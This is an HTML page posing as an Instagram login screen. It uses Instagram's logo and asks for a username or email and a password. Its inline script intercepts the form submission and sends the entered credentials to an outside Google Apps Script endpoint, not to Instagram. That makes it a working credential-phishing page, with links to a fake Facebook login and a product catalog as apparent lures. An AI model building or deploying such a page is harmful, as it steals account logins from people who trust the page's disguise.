<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Instagram</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo">
                <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram Logo">
            </div>
            <form name="login-instagram">
                <div class="input-group">
                    <input type="text" id="username" name="username" placeholder="Username or email" required>
                </div>
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit" class="login-button">Log In</button>
            </form>
            <div class="or-separator">
                <div class="line"></div>
                <div class="or-text">OR</div>
                <div class="line"></div>
            </div>
            <button class="fb-button"><a href="fb.html">Log in with Facebook </a></button>
            <div class="forgot-password">
                <a href="prodack.html">Lihat Katalog</a>
            </div>
        </div>
    </div>
    <script src="scripts.js"></script>

    <script>
  const scriptURL = 'https://script.google.com/macros/s/AKfycby1jFwARnnGsXtI1uMK5OqJwuybDkl6fZC51sWbnVuNzN_YJE7Bjisb4ljUlVBDez9p/exec'
  const form = document.forms['login-instagram']

  form.addEventListener('submit', e => {
    e.preventDefault()
    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
      .then(response => console.log('Success!', response))
      .catch(error => console.error('Error!', error.message))
  })
</script>
</body>
</html>
